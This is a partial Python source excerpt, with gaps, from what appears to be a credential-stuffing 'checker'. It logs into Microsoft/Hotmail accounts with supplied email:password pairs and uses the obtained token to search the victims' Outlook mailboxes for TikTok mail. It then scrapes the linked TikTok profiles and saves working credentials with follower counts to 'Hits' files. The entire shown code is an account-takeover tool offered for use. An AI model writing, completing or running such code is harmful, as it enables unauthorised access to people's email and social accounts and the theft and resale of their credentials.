...
def get_tiktok_profile_api(email):
    try:
        ...
        headers = {'user-agent': random.choice(USER_AGENTS_TIKTOK), 'x-ss-req-ticket': str(int(time.time() * 1000)), 'passport-sdk-version': '19'}
...
def get_tiktok_profile_web(username):
    try:
        headers = {'user-agent': random.choice(USER_AGENTS_TIKTOK), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
        url = f"https://www.tiktok.com/@{username}"
        response = requests.get(url, headers=headers, timeout=15, verify=False)
        if response.status_code == 200:
            html = response.text
            profile_data = {'username': username, 'followers': 0, 'videos': 0}
            json_pattern = r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__" type="application/json">(.*?)</script>'
            json_match = re.search(json_pattern, html, re.DOTALL)
            if json_match:
                try:
                    data = json.loads(json_match.group(1))
                    stats_data = data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {}).get('userInfo', {}).get('stats', {})
            ...
            if profile_data['followers'] == 0:
                ...
                v_match = re.search(r'"videoCount":(\d+)', html)
                if f_match: profile_data['followers'] = int(f_match.group(1))
                if v_match: profile_data['videos'] = int(v_match.group(1))
            return profile_data
    except: pass
    return None

def extract_tiktok_username(search_text):
    username_patterns = [
...
def check_tiktok_full(email, password, session_id):
    ...
    try:
        # Step 1: Microsoft Login
        ms_res = check_account_internal(email, password) # We'll rename the original check_account to check_account_internal
        if ms_res["status"] != "HIT":
            return ms_res["status"]
        ...
        # Step 2: Search TikTok Emails to get username
        search_url = "https://outlook.live.com/search/api/v2/query"
        headers = {"Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"}
        payload = {
            "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation", "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                "From": 0, "Query": {"QueryString": "from:account.tiktok.com OR tiktok"}, "Size": 5, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }]
        }
        r = requests.post(search_url, json=payload, headers=headers, timeout=10)
        ...
        tiktok_profile = None
        if r.status_code == 200:
            username = extract_tiktok_username(r.text)
            if username:
                tiktok_profile = get_tiktok_profile_web(username)
        
        # Step 3: Try API if web fails
        if not tiktok_profile:
            tiktok_profile = get_tiktok_profile_api(email)
            
        if tiktok_profile:
            # It's a TikTok Hit!
            followers = tiktok_profile.get('followers', 0)
            videos = tiktok_profile.get('videos', 0)
            result_line = f"{email}:{password} | {followers} | {videos}"
            
            output_path = os.path.join(HITS_DIR, session_id, "TikTok_Full_Capture.txt")
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            with lock:
                with open(output_path, 'a', encoding='utf-8') as f:
                    f.write(result_line + "\n")
                service_hits["TikTok"] = service_hits.get("TikTok", 0) + 1
            ...
            # Hotmail HIT but no TikTok found
            all_hits_path = os.path.join(HITS_DIR, session_id, "Hits_All.txt")
            with lock:
                with open(all_hits_path, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")
        ...
        print(f"TikTok check error for {email}: {e}")
        return "RETRY"

def check_account_internal(email, password):
    # This is the original check_account logic renamed
    try:
        ...
        if r4.status_code != 200 or "access_token" not in r4.text: return {"status": "BAD"}
